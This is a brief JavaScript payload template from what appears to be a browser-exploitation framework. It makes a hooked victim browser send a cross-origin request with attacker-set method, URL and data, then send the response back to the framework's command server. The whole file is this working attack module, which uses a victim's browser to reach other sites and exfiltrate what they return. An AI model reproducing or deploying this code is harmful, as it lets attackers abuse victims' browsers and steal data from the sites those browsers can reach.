//
// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {

	var method = "<%= @method %>";
	var url    = "<%= @url %>";
	var data   = "<%= @data %>";
	var timeout = 15000;

	server.net.cors.request(method, url, data, timeout, function(response) { server.net.send("<%= @command_url %>", <%= @command_id %>, "response="+JSON.stringify(response)); });

});

